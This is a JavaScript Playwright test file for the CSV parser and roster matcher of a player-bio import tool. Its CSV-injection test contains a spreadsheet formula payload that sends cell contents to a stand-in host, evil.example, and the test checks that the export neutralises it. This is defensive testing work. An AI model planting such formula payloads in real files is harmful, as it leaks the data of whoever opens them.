// @ts-check
/**
 * The player-bio CSV round trip: parsing, and who a row is allowed to name.
 *
 * Tested directly rather than through the page, which is the rule in AGENTS.md
 * for anything that decides an outcome from data. Both halves earn it:
 *
 *   - the parser is where the bugs are, and driving it through a file picker
 *     would exercise the file picker;
 *   - the matcher is the security boundary. The CSV spends its life in a document
 *     an entire team can edit, so "which player does this row name" is a question
 *     asked about hostile input, and it deserves to be asked directly.
 */
const { test } = require('@playwright/test');
const { expect } = require('./helpers');

const Csv = require('../../shared/csv.js');
const Bios = require('../../shared/bios.js');

const ROSTER = [
  { id: 301, num: 1, name: 'Alex Auer' },
  { id: 302, num: 7, name: 'Kim Ebner' },
  { id: 303, num: 12, name: 'Bea Blade' },
];

/** Build a file the way a spreadsheet would export it. */
function csv(rows, headers) {
  return Csv.stringify(headers || Bios.exportHeaders(), rows);
}

test.describe('csv parsing', () => {
  test('a quoted field keeps its commas and newlines', () => {
    // The case that makes split(',') wrong on the first real row, and the reason
    // this module exists: the note is truncated and every later column shifts.
    const text = 'Player ID,Name,Story\r\n'
      + '301,Alex Auer,"Handball, then ultimate at university"\r\n'
      + '302,Kim Ebner,"Line one\nLine two"\r\n';
    const out = Csv.parse(text);
    expect(out.headers).toEqual(['Player ID', 'Name', 'Story']);
    expect(out.rows).toHaveLength(2);
    expect(out.rows[0].Story).toBe('Handball, then ultimate at university');
    expect(out.rows[1].Story).toBe('Line one\nLine two');
  });

  test('a doubled quote is an escaped quote', () => {
    const out = Csv.parse('A,B\r\n1,"she said ""go"" and went"\r\n');
    expect(out.rows[0].B).toBe('she said "go" and went');
  });

  test('the delimiter is sniffed outside quotes, not counted everywhere', () => {
    // A European Excel writes semicolons. The commas inside the quoted field
    // outnumber them, so a naive count picks the comma and the whole file parses
    // as one column.
    const text = 'Player ID;Name;Story\r\n301;Alex Auer;"Handball, football, then ultimate"\r\n';
    expect(Csv.sniff(text)).toBe(';');
    const out = Csv.parse(text);
    expect(out.delimiter).toBe(';');
    expect(out.rows[0].Story).toBe('Handball, football, then ultimate');
  });

  test('a UTF-8 BOM does not become part of the first header', () => {
    // Excel writes one. Left in, "Player ID" arrives as "﻿Player ID" and the
    // identifier column is silently not found.
    const out = Csv.parse('﻿Player ID,Story\r\n301,anything\r\n');
    expect(out.headers[0]).toBe('Player ID');
    expect(Bios.match(out, ROSTER, {}).fatal).toBeUndefined();
  });

  test('all three line endings work, and a trailing newline adds no phantom row', () => {
    for (const eol of ['\r\n', '\n', '\r']) {
      const out = Csv.parse(`A,B${eol}1,2${eol}3,4${eol}`);
      expect(out.rows, `line ending ${JSON.stringify(eol)}`).toHaveLength(2);
    }
    expect(Csv.parse('A,B\n1,2').rows).toHaveLength(1);
  });

  test('a name that looks like a formula is exported as text', () => {
    // CSV injection. The export carries player names out of the database into a
    // file the team opens in Sheets or Excel, and a name like
    // =HYPERLINK("http://x/?"&A1,"hi") runs on open. Quoting does not help --
    // both applications evaluate a formula inside a quoted field -- so the cell
    // has to be marked as text.
    const hostile = '=HYPERLINK("http://evil.example/?"&A1,"click")';
    const text = Csv.stringify(['Player ID', 'Name'], [{ 'Player ID': 1, Name: hostile }]);
    expect(text).not.toMatch(/(^|[,\r\n"])=HYPERLINK/);
    expect(text).toContain("'=HYPERLINK");

    for (const lead of ['=', '+', '-', '@']) {
      const out = Csv.stringify(['A'], [{ A: `${lead}danger` }]);
      expect(out, `${lead} must be neutralised`).toContain(`'${lead}danger`);
    }
    // Ordinary values are left alone.
    expect(Csv.stringify(['A'], [{ A: 'Alex Auer' }])).toContain('Alex Auer');
    expect(Csv.stringify(['A'], [{ A: 'Alex Auer' }])).not.toContain("'Alex");
  });

  test('a neutralised name still matches its roster entry on the way back', () => {
    // The defence must not break the identity check it sits next to: the name
    // comes back carrying an apostrophe and still has to be recognised.
    const roster = [{ id: 400, num: 4, name: '=Odd Name' }];
    const text = Csv.stringify(['Player ID', 'Name', 'Interests'],
      [{ 'Player ID': 400, Name: '=Odd Name', Interests: 'chess' }]);
    const report = Bios.match(Csv.parse(text), roster, {});
    expect(report.accepted).toHaveLength(1);
  });

  test('round-trips through stringify without losing anything', () => {
    const nasty = 'Comma, quote " and\nnewline';
    const text = Csv.stringify(['Player ID', 'Story'], [{ 'Player ID': 301, Story: nasty }]);
    expect(Csv.parse(text).rows[0].Story).toBe(nasty);
  });
});

test.describe('bio import: who a row is allowed to name', () => {
  test('an edited identifier cannot reach the opposing team', () => {
    // THE attack this guards. The sheet is editable by a whole team; 999 is a
    // player on the other side. Scoping the candidate set to one roster means the
    // row cannot name them however the identifier was written.
    const out = Csv.parse(csv([
      { 'Player ID': 999, Name: 'Someone Else', 'Interests outside ultimate': 'bogus' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected).toHaveLength(1);
    expect(report.rejected[0].why).toMatch(/not on this roster/);
  });

  test('retargeting a teammate is caught by the name that travelled with the id', () => {
    // Within-team version of the same trick: keep a valid id, change whose row it
    // is. The exported name comes back with the identifier and has to agree.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Kim Ebner', 'Interests outside ultimate': 'bogus' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected[0].why).toMatch(/name does not match/);
    expect(report.rejected[0].why).toMatch(/Alex Auer/);
  });

  test('honest variation in a name is still accepted', () => {
    // Strict on letters, loose on accents, case, punctuation and spacing --
    // otherwise a spreadsheet round trip rejects real rows and the check becomes
    // something people work around.
    for (const written of ['alex auer', 'Alex  Auer', 'Álex Auer', 'Alex-Auer']) {
      const out = Csv.parse(csv([
        { 'Player ID': 301, Name: written, 'Interests outside ultimate': 'climbing' },
      ]));
      const report = Bios.match(out, ROSTER, {});
      expect(report.accepted, `"${written}" should be accepted`).toHaveLength(1);
    }
  });

  test('several filled columns compose into one labelled note', () => {
    const out = Csv.parse(csv([{
      'Player ID': 302,
      Name: 'Kim Ebner',
      'Other sports played': 'Handball',
      'Occupation or study': 'Marine biology',
    }]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text)
      .toBe('Other sports played: Handball\nOccupation or study: Marine biology');
  });

  test('a single filled column is not labelled with its own question', () => {
    const out = Csv.parse(csv([
      { 'Player ID': 302, Name: 'Kim Ebner', 'Other sports played': 'Handball' },
    ]));
    expect(Bios.match(out, ROSTER, {}).accepted[0].text).toBe('Handball');
  });

  test('an untouched export imports nothing rather than blanking the roster', () => {
    // A team that uploads the file and never fills it in must not wipe anything.
    const out = Csv.parse(csv(Bios.exportRows(ROSTER)));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.empty).toBe(3);
    expect(report.matched).toBe(3);
  });

  test('a note a commentator already wrote is kept, not overwritten', () => {
    // Their own observations have no other home; a player's answers can simply be
    // imported again.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Alex Auer', 'Interests outside ultimate': 'from the sheet' },
    ]));
    const report = Bios.match(out, ROSTER, { 301: 'typed at the desk' });
    expect(report.accepted).toHaveLength(0);
    expect(report.kept).toHaveLength(1);
    expect(report.kept[0].name).toBe('Alex Auer');
  });

  test('a second row for one player does not silently win', () => {
    const out = Csv.parse(csv([
      { 'Player ID': 303, Name: 'Bea Blade', 'Interests outside ultimate': 'first' },
      { 'Player ID': 303, Name: 'Bea Blade', 'Interests outside ultimate': 'second' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('first');
    expect(report.rejected[0].why).toMatch(/second row/);
  });

  test('a file with no identifier column is refused outright', () => {
    // Rather than guessing which column is the id, which is how a whole roster
    // ends up with somebody else's biography.
    const out = Csv.parse('Name,Story\r\nAlex Auer,anything\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.fatal).toMatch(/identifier column/);
    expect(report.accepted).toHaveLength(0);
  });

  test('a non-numeric identifier is reported, not coerced', () => {
    const out = Csv.parse('Player ID,Story\r\n"=1+1",anything\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected[0].why).toMatch(/not a number/);
  });

  test('a filled field column lands beside the name, not inside the note', () => {
    // Pronouns, nicknames and pronunciation are looked up at speed, so they
    // import into their own fields rather than disappearing into the composed
    // note text.
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'Handball',
    }]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('Handball');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'she/her' });
  });

  test('the export carries the field columns between the name and the prompts', () => {
    const headers = Bios.exportHeaders();
    expect(headers.slice(3, 6)).toEqual(['Nickname', 'Pronouns', 'Name pronunciation']);
    for (const p of Bios.PROMPTS) { expect(headers).toContain(p); }
  });

  test('a file of identifiers and pronouns alone is importable', () => {
    // The likeliest minimal round trip: a team answers nothing else. It must not
    // be refused as "no content columns".
    const out = Csv.parse('Player ID,Pronouns\r\n301,they/them\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.fatal).toBeUndefined();
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'they/them' });
  });

  test('fill and keep are decided per channel, not per row', () => {
    // A note typed at the desk must not block the pronouns nobody had -- and the
    // typed note must not be replaced by the row that brings them.
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'from the sheet',
    }]));
    const report = Bios.match(out, ROSTER, { 301: { text: 'typed at the desk' } });
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'she/her' });
  });

  test('a row whose every channel is already written is kept', () => {
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'answered',
    }]));
    const report = Bios.match(out, ROSTER,
      { 301: { text: 'typed', pronouns: 'they/them' } });
    expect(report.accepted).toHaveLength(0);
    expect(report.kept).toHaveLength(1);
  });

  test('every row is accounted for', () => {
    // Nothing may be dropped in silence: the preview tally is what the reader
    // decides on, so the numbers have to add up to the file.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Alex Auer', 'Interests outside ultimate': 'kept' },
      { 'Player ID': 302, Name: 'Kim Ebner', 'Interests outside ultimate': 'new' },
      { 'Player ID': 303, Name: 'Bea Blade' },
      { 'Player ID': 999, Name: 'Stranger', 'Interests outside ultimate': 'foreign' },
    ]));
    const report = Bios.match(out, ROSTER, { 301: 'already here' });
    expect(report.total).toBe(4);
    expect(report.accepted.length + report.kept.length + report.empty
      + report.rejected.length).toBe(report.total);
  });
});
